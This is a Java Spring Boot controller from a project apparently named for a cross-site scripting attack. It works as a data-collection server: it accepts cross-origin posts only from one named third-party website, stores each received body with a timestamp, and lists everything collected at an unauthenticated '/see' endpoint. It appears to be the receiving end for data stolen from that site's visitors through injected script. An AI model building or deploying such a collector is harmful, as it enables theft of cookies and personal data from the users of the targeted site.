package com.github.duc010298.xssattack.controller;

import java.util.Date;
import java.util.List;

import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.web.bind.annotation.CrossOrigin;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestBody;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;

import com.github.duc010298.xssattack.entity.DataEntity;
import com.github.duc010298.xssattack.repository.DataRepository;

@RestController
@RequestMapping("/")
public class MainController {
	
	@Autowired
	private DataRepository dataRepository;

    @CrossOrigin(origins = "https://truejuice.vn")
    @PostMapping
    public String Test(@RequestBody String object) {
        System.out.println(object);
        DataEntity dataEntity = new DataEntity();
        dataEntity.setDataObject(object);
        dataEntity.setTimeUp(new Date());
        dataRepository.save(dataEntity);
        return "Done";
    }
    
    @GetMapping("/see")
    public List<DataEntity> getAll() {
    	List<DataEntity> list = dataRepository.findAll();
    	return list;
    }
}